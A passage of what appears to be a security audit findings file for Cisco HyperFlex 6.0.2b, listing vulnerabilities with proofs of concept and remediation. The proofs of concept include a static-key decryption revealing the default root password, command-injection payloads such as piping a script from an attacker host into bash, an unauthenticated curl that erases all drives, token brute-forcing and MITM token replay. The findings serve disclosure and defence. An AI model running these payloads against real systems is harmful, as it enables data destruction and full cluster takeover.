        "import hashlib, base64\n"
        "from Crypto.Cipher import AES\n\n"
        "def md5_file(path):\n"
        "    h = hashlib.md5()\n"
        "    with open(path, 'rb') as f:\n"
        "        for chunk in iter(lambda: f.read(4096), b''):\n"
        "            h.update(chunk)\n"
        "    return h.hexdigest()\n\n"
        "def unpad(s): return s[:-ord(s[len(s)-1:])]\n\n"
        "def decrypt(key, enc):\n"
        "    enc = base64.b64decode(enc)\n"
        "    iv = enc[:16]\n"
        "    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
        "    return unpad(cipher.decrypt(enc[16:]))\n\n"
        "key = md5_file('/usr/share/hyperflex/storfs-misc/Secret.class')\n"
        "# key = '1f6d13bcd7753f2d3b2e2da361b7afb5'  (static across all 6.0.2b installs)\n\n"
        "print(decrypt(key, 'DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU='))  # Cisco123\n"
        "print(decrypt(key, 'yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s='))  # springpath\n\n"
        "# SSH to ctlVM with decrypted default password\n"
        "# ssh root@<ctlvm_ip>  # password: Cisco123"
    ),
    "files": [
        "/usr/share/hyperflex/storfs-misc/Secret.class",
        "/usr/share/hyperflex/storfs-misc/springpath_default.tunes",
        "/opt/hyperflex/storfs-factory/utils/springpath_env_parse.py",
    ],
    "remediation": (
        "1. Replace MD5(Secret.class) key derivation with a properly seeded per-installation "
        "   secret (e.g., PBKDF2 with per-node salt generated at first boot, stored in "
        "   a hardware-backed keystore or TPM).\n"
        "2. Remove Secret.class from the firmware distribution package; key material must "
        "   never ship alongside ciphertext.\n"
        "3. Rotate all credentials currently stored in *.tunes files; the 6.0.2b default "
        "   key is now known.\n"
        "4. Enforce mandatory credential rotation during initial cluster deployment; reject "
        "   'Cisco123' as stctl_vm_passwd at the UI layer.\n"
        "5. Restrict ctlVM SSH (port 22) to the storage management network; prevent access "
        "   from the ESXi management VLAN."
    ),
}

HX_F140 = {
    "id": "HX-F140",
    "title": (
        "HyperFlex HXDP 6.0.2b hx-iscsi — OS Command Injection via Unsanitized --gateway/--interface "
        "Arguments in shell=True subprocess Calls Achieves Root Code Execution on ctlVM"
    ),
    "severity": "HIGH",
    "cvss": "8.8",
    "cvss_vector": "AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
    "cwe": "CWE-78",
    "versions_affected": "6.0.2b (confirmed); all versions shipping hx-iscsi with affected scripts",
    "component": "hx-iscsi package (configureNetworking.py + storageClientNetworkConfigure.py)",
    "description": (
        "Two Python scripts in the hx-iscsi package pass unsanitized command-line arguments "
        "directly into shell=True subprocess calls, allowing OS command injection when "
        "network configuration parameters are attacker-influenced.\n\n"
        "Affected file 1: /opt/hyperflex/hx-iscsi/configureNetworking.py\n"
        "  Line 321 (command construction):\n"
        "    command = \"fping -I %s %s\" %(NetworkSetup.INTERFACE, NetworkSetup.GATEWAY)\n"
        "  Line 177 (execution):\n"
        "    status = subprocess.call(command, shell=True)\n"
        "  INTERFACE and GATEWAY are set directly from --interface and --gateway cmdline args\n"
        "  (parse_cmdline_args(), lines 123-130) with no sanitization, validation, or escaping.\n\n"
        "Affected file 2: /opt/hyperflex/hx-iscsi/storageClientNetworkConfigure.py\n"
        "  Line 220 (command construction):\n"
        "    command = \"fping -I eth-iscsi1 %s\" %(NetworkSetup.GATEWAY)\n"
        "  Line 142 (execution):\n"
        "    status = subprocess.call(command, shell=True)\n"
        "  GATEWAY is set from the --gateway cmdline arg with no sanitization.\n"
        "  The same GATEWAY value is written verbatim to the interface config file:\n"
        "    content = content + 'gateway ' + NetworkSetup.GATEWAY + '\\n'  (line 181)\n\n"
        "Both scripts execute as root (they modify /etc/netplan/, /etc/iproute2/rt_tables, "
        "call 'netplan apply', and restart iscsisvc.service).\n\n"
        "Attack chain: a stDeploy Thrift client with cluster-admin privilege calls a network "
        "reconfiguration method; stDeploy passes the supplied iSCSI gateway/interface values "
        "to these scripts via ansible extra-vars; the scripts execute the injected payload "
        "as root on the ctlVM. During the upgrade migration path (configure-networks.yml), "
        "gateway values previously written to /tmp-config/etc/network/eth-iscsi1.interface "
        "are read back and passed to configureNetworking.py without sanitization, creating "
        "a second injection surface through persisted configuration.\n\n"
        "Injection examples:\n"
        "  --gateway '10.0.0.1; curl http://attacker/shell.sh | bash'\n"
        "  --interface 'eth0 $(id>/tmp/pwned)'\n"
        "  --gateway '$(chmod u+s /bin/bash)'",
    ),
    "proof_of_concept": (
        "# Payload delivery via --gateway argument\n"
        "# configureNetworking.py line 321:\n"
        "#   command = \"fping -I eth-iscsi1 %s\" % GATEWAY\n"
        "#   subprocess.call(command, shell=True)  # shell expands ; and $(...)\n\n"
        "# Injection:\n"
        "GATEWAY = '10.0.0.1; id > /tmp/pwned'\n"
        "command = 'fping -I eth-iscsi1 ' + GATEWAY\n"
        "# Executed shell string: 'fping -I eth-iscsi1 10.0.0.1; id > /tmp/pwned'\n"
        "# fping exits, then id runs as root\n\n"
        "# Interface injection (configureNetworking.py only):\n"
        "INTERFACE = 'eth-iscsi1 $(touch /tmp/injected)'\n"
        "command = 'fping -I eth-iscsi1 $(touch /tmp/injected) 10.0.0.1'\n"
        "# $(...) evaluated by shell at execution time"
    ),
    "files": [
        "/opt/hyperflex/hx-iscsi/configureNetworking.py",
        "/opt/hyperflex/hx-iscsi/storageClientNetworkConfigure.py",
    ],
    "remediation": (
        "1. Replace subprocess.call(command, shell=True) with subprocess.call(args_list, "
        "   shell=False) where args_list is a pre-split argument array:\n"
        "     subprocess.call(['fping', '-I', INTERFACE, GATEWAY], shell=False)\n"
        "2. Validate INTERFACE against an allowlist of known interface names (regex: "
        "   ^[a-zA-Z0-9\\-]+$) before any use.\n"
        "3. Validate GATEWAY as a well-formed IPv4 or IPv6 address using ipaddress.ip_address() "
        "   (the module is already imported in both scripts) and reject any value that fails.\n"
        "4. Apply the same fix to the ip route command at line 182 of storageClientNetworkConfigure.py "
        "   which appends GATEWAY verbatim into a shell command string written to the interface file."
    ),
}

HX_F141 = {
    "id": "HX-F141",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-appliance sedsvc — Unauthenticated HTTP API on Port 8012 "
        "Exposes SED Drive Cryptographic Erasure and Node KEK to Any Network Client"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
    "cwe": "CWE-306",
    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-appliance with sedsvc",
    "component": "storfs-appliance package (sedsvc Go binary)",
    "description": (
        "sedsvc is a Go HTTP server that manages TCG OPAL Self-Encrypting Drive (SED) "
        "operations on HXDP storage controller VMs. It listens on all network interfaces "
        "(0.0.0.0:8012) and implements zero authentication on all endpoints.\n\n"
        "Default listen address confirmed via main.main disassembly:\n"
        "  movq $0x1f4c, main.port   ; 0x1f4c = 8012 decimal\n"
        "  server.Addr = ':8012'     ; binds to all interfaces\n\n"
        "The HTTP dispatch function main.(*myHandler).ServeHTTP performs a single map "
        "lookup (URL string → handler function pointer) and calls the handler directly "
        "with zero interposed authentication or authorization check.\n\n"
        "Confirmed exposed endpoints (via Go symbol table + HXDP_* function prefix convention):\n"
        "  POST /sec_erase_all  → BMC_SecureEraseAll → SEDUTIL_SecureEraseAll\n"
        "                          Cryptographically erases ALL SED drives on the node.\n"
        "                          Data is irrecoverable. Confirmed call chain:\n"
        "                          json.Decode(body) → BMC_SecureEraseAll @ 0x674940\n"
        "  POST /sec_erase      → BMC_SecureErase → SEDUTIL_SecureErase\n"
        "                          Erases a specific drive by serial number.\n"
        "  GET  /get_config     → BMC_GetConfigFileAndDispatch\n"
        "                          Returns config.json from BMC, which contains the node KEK\n"
        "                          (Key Encryption Key) as a base64-encoded string.\n"
        "                          The node KEK is used to unlock drive encryption keys.\n"
        "  GET  /get_inventory  → SEDUTIL_GetInventory\n"
        "                          Returns per-drive encryption state, serial numbers,\n"
        "                          firmware versions, and lock status.\n"
        "  GET  /disk_status    → HXDP_DiskStatus\n"
        "  GET  /hello          → HXDP_Hello (service liveness probe)\n"
        "  POST /start_polling  → BMC_PollConfigFile\n"
        "  POST /stop_polling   → stops BMC config polling\n\n"
        "The ctlVM management NIC (eth0) is accessible to ESXi hosts, vCenter, and any "
        "administrator workstation on the HX management VLAN. The sedsvc service binds to "
        "all interfaces including the storage data NIC, extending the exposure surface.\n\n"
        "The service is activated only on SED-capable clusters "
        "(/etc/hyperflex/sed_capability.conf: sed_capable_cluster=True) but is otherwise "
        "unrestricted.\n\n"
        "Impact chain:\n"
        "  1. Attacker on HX management VLAN sends unauthenticated POST to any ctlVM:8012/sec_erase_all\n"
        "  2. sedsvc calls SEDUTIL_SecureEraseAll without credential check\n"
        "  3. All SED drives on the node are cryptographically erased — data is unrecoverable\n"
        "  Alternatively:\n"
        "  1. GET :8012/get_config → extract base64 node KEK from response JSON\n"
        "  2. KEK used to derive drive encryption keys across all drives on the node"
    ),
    "proof_of_concept": (
        "# Unauthenticated secure erase all drives\n"
        "# No auth token, no session cookie, no TLS client cert required\n"
        "curl -s -X POST http://<ctlvm_ip>:8012/sec_erase_all \\\n"
        "  -H 'Content-Type: application/json' \\\n"
        "  -d '{}'\n"
        "# Result: all SED drives on the node are cryptographically erased\n\n"
        "# Retrieve node KEK\n"
        "curl -s http://<ctlvm_ip>:8012/get_config\n"
        "# Response JSON contains: {\"nodeKek\": \"<base64_kek>\", ...}\n\n"
        "# sedsvc ServeHTTP dispatch (no auth):\n"
        "# 0x666b60:  call mapaccess2_faststr(mux, url_path)\n"
        "# 0x666b65:  test bl,bl     ; found?\n"
        "# 0x666b67:  je not_found   ; only check is: does route exist?\n"
        "# 0x666b80:  call *rsi      ; call handler directly, NO auth gate"
    ),
    "files": [
        "/usr/share/hyperflex/storfs-appliance/sedsvc",
        "/etc/hyperflex/sed_capability.conf",
    ],
    "remediation": (
        "1. Add authentication to all sedsvc endpoints. Minimum: shared secret or "
        "   bearer token validated before any HXDP_* handler is called. Bind to "
        "   127.0.0.1 only if remote access is not required; use a local Unix socket "
        "   for intra-node IPC instead of TCP if the caller is always local.\n"
        "2. Restrict TCP port 8012 to loopback (127.0.0.1) via iptables/nftables; "
        "   proximate callers (storfs-core) can use localhost.\n"
        "3. If remote invocation is required, enforce mTLS with a node certificate "
        "   before dispatching any drive operation.\n"
        "4. Gate /sec_erase and /sec_erase_all behind an additional confirmation "
        "   token with short TTL (e.g., TOTP or signed nonce) to prevent single-packet "
        "   drive erasure."
    ),
}

HX_F142 = {
    "id": "HX-F142",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-mgmt-cli — Global TLS Certificate Verification Disabled "
        "Across All Management Client Code Exposes X-RootSessionID Token to MITM"
    ),
    "severity": "HIGH",
    "cvss": "7.5",
    "cvss_vector": "AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-295",
    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-mgmt-cli stCli egg",
    "component": (
        "storfs-mgmt-cli package (stCli-1.0-py3.11.egg: StTransportBase.py, commonFunctions.py, stCli.py)"
    ),
    "description": (
        "All HyperFlex management client code in stCli-1.0-py3.11.egg disables TLS "
        "certificate verification before making API connections. The bypass is applied "
        "globally (modifying the process-level SSL default context) before any connection "
        "is established, affecting all subsequent TLS connections in the same process.\n\n"
        "Affected code locations (3 independent sites):\n\n"
        "1. StTransportBase.init_transport() (line 85):\n"
        "   ssl._create_default_https_context = ssl._create_unverified_context\n"
        "   Applied before every Thrift-over-HTTPS connection (ports 9341, 9333, etc.)\n\n"
        "2. stCli.py main entry point (line 13509):\n"
        "   ssl._create_default_https_context = ssl._create_unverified_context\n"
        "   Applied before the CLI connects to HX Connect REST API (port 443)\n\n"
        "3. commonFunctions.runRestQueries() (lines 29-33):\n"
        "   requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n"
        "   verify=False (function default, passed to all requests.get/post/put calls)\n"
        "   Warnings actively suppressed to prevent detection.\n\n"
        "Consequence: any TLS MITM between stCli and the HyperFlex management server "
        "succeeds silently. The attacker can present an arbitrary certificate and the "
        "client will accept it.\n\n"
        "Critically, the root administrative session token is transmitted over these "
        "unverified connections. When no SSO or user session is available, the client "
        "reads /etc/hyperflex/secure/root_file.pub and sends it as the X-RootSessionID "
        "HTTP header:\n\n"
        "  commonFunctions.py lines 38-42:\n"
        "    with open('/etc/hyperflex/secure/root_file.pub') as f:\n"
        "        rootSessionId = f.readlines()[0].strip()\n"
        "    headers = {'X-RootSessionID': rootSessionId,\n"
        "               'X-LoggedInUser': 'admin',\n"
        "               'X-Scope': 'READ,MODIFY',\n"
        "               'X-RequestInitiator': 'Internal'}\n\n"
        "The X-RootSessionID token grants root-level administrative access to the entire "
        "HyperFlex cluster management plane. An attacker who intercepts this token can "
        "replay it against the actual management server to execute arbitrary cluster "
        "management operations.\n\n"
        "Attack scenario: Attacker on the HX management VLAN performs ARP poisoning "
        "between ctlVM and HX Connect management server → intercepts stCli HTTPS traffic "
        "→ accepts via fake TLS cert → captures X-RootSessionID → replays to gain full "
        "cluster admin access."
    ),
    "proof_of_concept": (
        "# MitM attack: attacker on HX management network\n"
        "# 1. ARP poison the path from ctlVM to HX Connect (port 443)\n"
        "# 2. Start TLS interceptor with self-signed cert\n"
        "#    → client accepts ANY cert (ssl._create_unverified_context)\n"
        "# 3. Capture HTTP headers from proxied request\n"
        "#    Request headers include:\n"
        "#    X-RootSessionID: <token from /etc/hyperflex/secure/root_file.pub>\n"
        "#    X-LoggedInUser: admin\n"
        "#    X-Scope: READ,MODIFY\n"
        "# 4. Replay captured token to actual HX Connect server:\n"
        "curl -k -H 'X-RootSessionID: <captured_token>' \\\n"
        "     -H 'X-LoggedInUser: admin' \\\n"
        "     -H 'X-Scope: READ,MODIFY' \\\n"
        "     https://<hx_connect_ip>/rest/v1/cluster\n"
        "# → full cluster admin access\n\n"
        "# Underlying bypass - process-global, no way to override downstream:\n"
        "import ssl\n"
        "ssl._create_default_https_context = ssl._create_unverified_context\n"
        "# ALL subsequent ssl.create_default_context() calls now return unverified contexts"
    ),
    "files": [
        "/opt/hyperflex/storfs-mgmt-cli/stCli-1.0-py3.11.egg/stCli/StTransportBase.py",
        "/opt/hyperflex/storfs-mgmt-cli/stCli-1.0-py3.11.egg/stCli/commonFunctions.py",
        "/opt/hyperflex/storfs-mgmt-cli/stCli-1.0-py3.11.egg/stCli/stCli.py",
        "/etc/hyperflex/secure/root_file.pub",
    ],
    "remediation": (
        "1. Remove all three ssl._create_default_https_context bypass assignments. "
        "   The management server's certificate must be verified against the cluster CA.\n"
        "2. Replace verify=False in commonFunctions.runRestQueries with "
        "   verify='/etc/hyperflex/certs/cluster-ca.pem' (the cluster CA cert path).\n"
        "3. Remove requests.packages.urllib3.disable_warnings(InsecureRequestWarning) — "
        "   suppressing warnings hides the insecure state from operators.\n"
        "4. Rotate the X-RootSessionID token (root_file.pub) at minimum on cluster "
        "   upgrade and preferably on each session boundary; bind it to the issuing "
        "   node's IP so replay from a different host is rejected.\n"
        "5. Pin the cluster management CA certificate in the stCli egg and validate "
        "   the server's certificate chain against it on every connection."
    ),
}

HX_F143 = {
    "id": "HX-F143",
    "title": "ESX Root Password Exposed in Process Command Line via factory_deploy.py",
    "severity": "MEDIUM",
    "cvss_score": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-214",
    "component": "storfs-factory",
    "file": "opt/hyperflex/storfs-factory/ansible/factory_deploy.py",
    "lines": "46-91",
    "description": (
        "factory_deploy.py accepts the ESX root password via the -p/--password "
        "command-line flag. The script base64-encodes the password and attempts "
        "log-time redaction (line 50: opts.esxPassword = 'XXXXXXXX') before "
        "restoring the encoded value (line 51: opts.esxPassword = save). The "
        "password is then passed verbatim as an ansible --extra-vars argument via "
        "os.execlpe() (lines 81-91): "
        "'esxPassword=%s' % (password). This spawns ansible-playbook with the "
        "base64-encoded ESX root credential in its argv. Base64 is trivially "
        "reversible. During factory deployment any local CVM process with read "
        "access to /proc can extract the plaintext ESX root password from "
        "/proc/<ansible-pid>/cmdline. The credential is also visible in 'ps aux' "
        "output to any local user. ESX root credentials grant full hypervisor "
        "access across all HyperFlex nodes."
    ),
    "proof": (
        "# Read cmdline of ansible process launched by factory_deploy.py\n"
        "# factory_deploy.py spawns ansible via os.execlpe (replaces itself):\n"
        "#   os.execlpe('./factory_deploy.yml', 'factory_deploy.yml',\n"
        "#              '--extra-vars', 'esxIp=<ip>',\n"
        "#              '--extra-vars', 'esxUserName=root',\n"
        "#              '--extra-vars', 'esxPassword=<base64>',  <-- exposed here\n"
        "#              '-vvvv', os.environ)\n"
        "# Recovery:\n"
        "cat /proc/$(pgrep -f factory_deploy.yml)/cmdline | tr '\\0' '\\n' | \\\n"
        "  grep esxPassword | cut -d= -f2 | base64 -d\n"
        "# OR via ps:\n"
        "ps aux | grep factory_deploy.yml | grep -o 'esxPassword=[^ ]*' | \\\n"
        "  cut -d= -f2 | base64 -d"
    ),
    "remediation": (
        "1. Pass the ESX password via an environment variable or a Vault-managed "
        "   secret reference instead of --extra-vars on the command line.\n"
        "2. Use ansible-vault to encrypt the credential at rest and pass only the "
        "   vault password file path as a cmdline argument.\n"
        "3. If --extra-vars must be used, write credentials to a temporary file "
        "   with mode 0600 and pass '@/tmp/secret.yml' instead of inline values; "
        "   shred the file immediately after os.execlpe returns.\n"
        "4. The base64 encoding on line 46-51 provides no security benefit and "
        "   should not be described as obfuscation in documentation."
    ),
}

HX_F144 = {
    "id": "HX-F144",
    "title": "Admin Session Token root_file.pub World-Readable (chmod 644)",
    "severity": "HIGH",
    "cvss_score": 7.1,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-732",
    "component": "storfs-misc",
    "file": "usr/share/hyperflex/storfs-misc/set_shared_key.sh",
    "lines": "10-13",
    "description": (
        "set_shared_key.sh creates the X-RootSessionID token file (root_file.pub) "
        "with chmod 644 — world-readable by all local users. The token grants "
        "admin-level access to all HyperFlex management APIs. The nginx internal "
        "listener (port 8997, rest_internal.conf) injects this token as "
        "X-RootSessionID into every proxied request to backend services on "
        "localhost:8000 (all REST APIs: rest, aaa, coreapi, dataprotection, "
        "backupservice, encryption, volume, securityservice, supportservice, "
        "slservice, upgrade) and localhost:9333 (stMgr Thrift). Any local user "
        "on the CVM (Controller VM) can read the token directly and authenticate "
        "as the internal root service account to all management plane APIs without "
        "any password. The token persists across reboots until explicitly rotated."
    ),
    "proof": (
        "# Any local CVM user:\n"
        "TOKEN=$(cat /etc/hyperflex/secure/root_file.pub)  # or /etc/root_file.pub\n"
        "# Direct to REST API backend:\n"
        "curl -sk https://localhost/rest/v1/clusters -H \"X-RootSessionID: $TOKEN\"\n"
        "# Direct to stMgr Thrift endpoint:\n"
        "curl -sk http://localhost:9333/stMgr -H \"X-RootSessionID: $TOKEN\" \\\n"
        "  -H \"Content-Type: application/x-thrift\"\n"
        "# Via nginx internal listener (auto-injects the token):\n"
        "curl -sk https://localhost:8997/rest/v1/clusters"
    ),
    "remediation": (
        "1. Change the file permission to 0640 (root:springpath group readable) "
        "   or 0600 (root-only) on line 12 of set_shared_key.sh.\n"
        "2. Use a dedicated service account group (e.g. 'hxservice') for processes "
        "   that legitimately need the token; do not make it world-readable.\n"
        "3. Audit all scripts and services that read root_file.pub and ensure they "
        "   run under accounts that are members of the restricted group.\n"
        "4. Rotate the token on each cluster upgrade and each cluster restart."
    ),
}

HX_F145 = {
    "id": "HX-F145",
    "title": "X-RootSessionID Token Generated with 15-bit $RANDOM Entropy",
    "severity": "MEDIUM",
    "cvss_score": 6.3,
    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-338",
    "component": "storfs-misc",
    "file": "usr/share/hyperflex/storfs-misc/set_shared_key.sh",
    "lines": "9-11",
    "description": (
        "set_shared_key.sh derives the X-RootSessionID admin token as "
        "'<product_uuid>-$RANDOM'. Bash $RANDOM produces values in [0, 32767] — "
        "only 15 bits of entropy. The product_uuid is the VMware VM UUID, "
        "obtainable from the hypervisor's managed object database, from VMware "
        "vCenter, or from the BIOS DMI table via 'dmidecode -s system-uuid' on "
        "any node in the cluster. An attacker with knowledge of the product_uuid "
        "can enumerate the full token space in at most 32,768 attempts, each "
        "attempt requiring a single HTTP request to an internal service. At "
        "1,000 req/s this brute-force completes in under 33 seconds. The resulting "
        "token grants full admin access to all HyperFlex management APIs "
        "(see HX-F144)."
    ),
    "proof": (
        "# Product UUID is readable from BIOS DMI table on any CVM:\n"
        "PRODUCT_UUID=$(dmidecode -s system-uuid 2>/dev/null | tr '[:upper:]' '[:lower:]')\n"
        "# Brute-force token space (32768 values):\n"
        "for i in $(seq 0 32767); do\n"
        "  TOKEN=\"${PRODUCT_UUID}-${i}\"\n"
        "  STATUS=$(curl -s -o /dev/null -w '%{http_code}' \\\n"
        "    https://localhost/rest/v1/clusters \\\n"
        "    -H \"X-RootSessionID: $TOKEN\")\n"
        "  if [ \"$STATUS\" = \"200\" ]; then\n"
        "    echo \"FOUND: $TOKEN\"; break\n"
        "  fi\n"
        "done"
    ),
    "remediation": (
        "1. Replace $RANDOM with cryptographically secure entropy: "
        "   'sharedkey=$(openssl rand -hex 32)' or Python "
        "   'secrets.token_hex(32)' — 256 bits.\n"
        "2. Do not incorporate the product_uuid into the token; a predictable "
        "   prefix reduces the effective entropy even if the suffix is strong.\n"
        "3. Ensure the generated token meets a minimum entropy requirement of "
        "   128 bits before writing to root_file.pub."
    ),
}

HX_F146 = {
    "id": "HX-F146",
    "title": "18-Day Default Session Token Lifetime in HyperFlex AAA Configuration",
    "severity": "MEDIUM",
    "cvss_score": 4.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
    "cwe": "CWE-613",
    "component": "storfs-support",
    "file": "WEB-INF/classes/application.conf",
    "lines": "28",
    "description": (
        "The HyperFlex AAA service configures a default session token lifetime "
        "of 1,555,200,000 milliseconds (18 days) via 'defaultTokenLifeTime' in "
        "application.conf and HxAAAConfig.json. An idle timeout of 30 minutes "
        "(defaultIdleTimeout = 1,800,000 ms) is also configured, but any session "
        "activity (including background polling from the HX Connect UI) resets "
        "the idle timer. An attacker who obtains a valid session token — via the "
        "TLS MITM described in HX-F142, from a compromised client machine, or "
        "from session logs — retains admin access for up to 18 days without "
        "needing to re-authenticate, spanning multiple password rotation cycles. "
        "The same 18-day lifetime appears in both the legacy HxAAAConfig.json "
        "(auth-war) and the active application.conf (support-war), confirming "
        "this is not a dead configuration path."
    ),
    "proof": (
        "# Verify token lifetime in application.conf:\n"
        "grep defaultTokenLifeTime /usr/share/hyperflex/storfs-support/WEB-INF/classes/application.conf\n"
        "# Expected: defaultTokenLifeTime = 1555200000\n"
        "# Conversion: 1555200000 ms / 1000 / 60 / 60 / 24 = 18.0 days\n"
        "python3 -c \"print(1555200000/1000/60/60/24, 'days')\"  # 18.0 days\n"
        "# Token issued via POST /aaa/v1/auth remains valid 18 days after issuance\n"
        "# regardless of admin password change during that window."
    ),
    "remediation": (
        "1. Reduce defaultTokenLifeTime to 3600000 ms (1 hour) for admin "
        "   sessions, aligned with NIST SP 800-63B session duration guidance.\n"
        "2. Implement absolute session expiration independent of idle timeout: "
        "   once a token is issued, it MUST expire at defaultTokenLifeTime "
        "   regardless of activity.\n"
        "3. Invalidate all outstanding tokens when an account password is "
        "   changed or rotated.\n"
        "4. Log token issuance and expiration to the audit log for forensic "
        "   reconstruction of session activity windows."
    ),
}

HX_F147 = {
    "id": "HX-F147",
    "title": "Old and New Plaintext Passwords Exposed in changepasswd.sh and mkpasswd.sh Command-Line Arguments",
    "severity": "MEDIUM",
    "cvss_score": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-214",
    "component": "storfs-mgmt",
    "file": "opt/hyperflex/changepasswd.sh, opt/hyperflex/mkpasswd.sh",
    "lines": "3-5, 10",
    "description": (
        "Two scripts in the HyperFlex management layer expose plaintext "
        "passwords as positional command-line arguments, making them "
        "visible to any local user via 'ps aux' or '/proc/<pid>/cmdline'.\n\n"
        "changepasswd.sh (lines 3-5) accepts three positional arguments: "
        "$1=user, $2=old_pass, $3=pass. Both the current (old) and new "
        "password are passed as separate unencoded cmdline arguments: "
        "'changepasswd.sh <user> <oldpassword> <newpassword>'. The script "
        "invokes 'sudo -u <user> passwd' via heredoc, but the plaintext "
        "passwords persist in the process table for the lifetime of the "
        "shell invocation — readable from /proc/<pid>/cmdline. "
        "This affects the root, admin, and diag accounts, which are "
        "enumerated in passwordSyncAccounts in storfs-mgmt application.conf "
        "and synced across all cluster nodes on every password rotation.\n\n"
        "mkpasswd.sh (line 10) accepts the plaintext password as $1 and "
        "invokes 'echo ${1} | mkpasswd -m sha-256 -s'. The unquoted "
        "variable expansion is passed as a cmdline argument, exposing the "
        "plaintext password in the process table before the shell pipes it "
        "to mkpasswd. This script is called as part of the same password "
        "management flow that feeds setpasswd.sh (which consumes the "
        "pre-hashed output).\n\n"
        "Unlike HX-F143 (factory_deploy.py, single deployment-time "
        "password), this path is triggered on every cluster password "
        "rotation for privileged accounts, increasing the exposure window "
        "across the operational lifetime of the cluster."
    ),
    "proof": (
        "# On any CVM with a local shell account, during a password change:\n"
        "# Terminal 1 — trigger a password change (as admin or via HX Connect):\n"
        "# Terminal 2 — observe the cmdline before the process exits:\n"
        "while true; do\n"
        "  ps auxww | grep changepasswd.sh | grep -v grep\n"
        "done\n"
        "# Expected output:\n"
        "# root <pid> ... /bin/bash ./changepasswd.sh admin OldP@ssw0rd NewP@ssw0rd\n\n"
        "# Alternatively, read from procfs:\n"
        "cat /proc/<pid>/cmdline | tr '\\0' ' '\n"
        "# Output: /bin/bash changepasswd.sh admin OldP@ssw0rd NewP@ssw0rd\n\n"
        "# Confirm passwordSyncAccounts scope:\n"
        "grep passwordSyncAccounts "
        "/opt/hyperflex/storfs-mgmt/stMgr-1.0/conf/application.conf\n"
        "# Expected: passwordSyncAccounts = [\"root\", \"admin\", \"diag\"]"
    ),
    "remediation": (
        "1. Replace positional argument password passing with stdin-only "
        "   delivery: read passwords from a named pipe, environment "
        "   variable (with immediate unset), or a securely-permissioned "
        "   temp file — never as $2/$3 cmdline arguments.\n"
        "2. For changepasswd.sh: invoke 'passwd' directly via PAM or "
        "   use 'chpasswd' with a pre-hashed credential supplied via "
        "   stdin (echo 'user:newhash' | chpasswd -e), bypassing the "
        "   old-password verification path that requires plaintext.\n"
        "3. For mkpasswd.sh: pass the plaintext password via stdin "
        "   rather than $1: 'read -rs pass; echo \"$pass\" | mkpasswd -m sha-256 -s'.\n"
        "4. Apply the same fix class as HX-F143 (factory_deploy.py): "
        "   never pass credentials as argv elements to child processes."
    ),
}

HX_F148 = {
    "id": "HX-F148",
    "title": (
        "TLS Certificate Verification Disabled in Upgrade REST Client "
        "(swagger_api_client.py) Exposes X-RootSessionID and Credentials to MITM "
        "During Cluster Upgrade Operations"
    ),
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": "storfs-mgmt / storfs-upgrade-bootstrap",
    "file": "opt/hyperflex/restClientModule/swagger_api_client.py",
    "lines": "101-114, 210",
    "description": (
        "The HyperFlex upgrade REST client (SwaggerClient in swagger_api_client.py) "
        "disables TLS certificate verification at three distinct points, then "
        "transmits the X-RootSessionID admin token and authentication credentials "
        "over the unverified TLS session during cluster upgrade operations.\n\n"
        "Lines 101-102: 'pkg.rest.urllib3.disable_warnings()' suppresses SSL "
        "certificate warnings globally for the swagger package, and "
        "'pkg.configuration.verify_ssl = False' disables certificate verification "
        "at the package configuration level for all subsequent requests.\n\n"
        "Lines 107-108: A local Configuration() object for swagger_coreapi is "
        "instantiated with 'configuration.verify_ssl = False', disabling "
        "verification for cluster lifecycle management, cluster monitoring, "
        "inventory discovery, and internal API endpoints.\n\n"
        "Lines 113-114: A local AgentConfiguration() object for swagger_upgrade_agent "
        "is instantiated with 'agentConfig.verify_ssl = False', disabling "
        "verification for all upgrade agent REST calls.\n\n"
        "Line 133: The X-RootSessionID token (read from "
        "/etc/hyperflex/secure/root_file.pub via get_local_root_session_id()) "
        "is set as a default header on every API call made through the "
        "unverified client: "
        "'rest_conn.set_default_header(header_name=\"X-RootSessionID\", "
        "header_value=root_session_id)'. An adjacently-positioned MiTM attacker "
        "can intercept this token during any upgrade operation and use it to "
        "gain admin access to all HyperFlex management APIs (see HX-F144).\n\n"
        "Line 210: The _get_auth_token() method invokes curl with the '-k' flag "
        "('curl ... -k') to request a JWT from the AAA endpoint at "
        "POST /aaa/v1/auth. The JSON body contains username and password "
        "fields; with certificate verification disabled, a MiTM attacker can "
        "capture plaintext credentials and the returned JWT in a single "
        "interception.\n\n"
        "Same vulnerability class as HX-F142 (stCli global TLS bypass) but "
        "limited to the upgrade code path; upgrade operations typically run "
        "with direct hypervisor access, making adjacent-network positioning "
        "feasible for an attacker with ESXi host access."
    ),
    "proof": (
        "# Confirm verify_ssl = False in upgrade REST client:\n"
        "grep -n 'verify_ssl' "
        "/opt/hyperflex/restClientModule/swagger_api_client.py\n"
        "# Expected: lines 102, 108, 114 all set verify_ssl = False\n\n"
        "# Confirm X-RootSessionID sent with disabled verification:\n"
